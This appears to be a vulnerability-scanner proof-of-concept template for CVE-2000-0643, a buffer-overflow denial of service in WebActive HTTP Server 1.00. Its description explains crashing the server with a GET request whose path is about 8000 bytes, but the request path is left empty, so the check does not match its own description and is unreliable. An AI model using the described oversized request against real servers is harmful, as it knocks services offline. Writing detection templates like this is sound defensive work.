[info]
author = "ave"
description = "WebActive HTTP Server 1.00 存在缓冲区溢出漏洞（CVE-2000-0643）。远程攻击者无需认证，向目标服务器的 80 端口发送包含超长路径（约 8000 字节）的 HTTP GET 请求，触发栈缓冲区溢出，导致服务器进程崩溃，造成拒绝服务。"
id = "POC-AVE-2000-0781"
name = "WebActive HTTP Server 1.00 缓冲区溢出拒绝服务 PoC"
severity = "medium"
tags = ["cve-2000-0643"]
vuln_id = [
    "CVE-2000-0643",
    "AVE-2000-0781",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = ""
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "reset",
    "refused",
    "timeout",
]
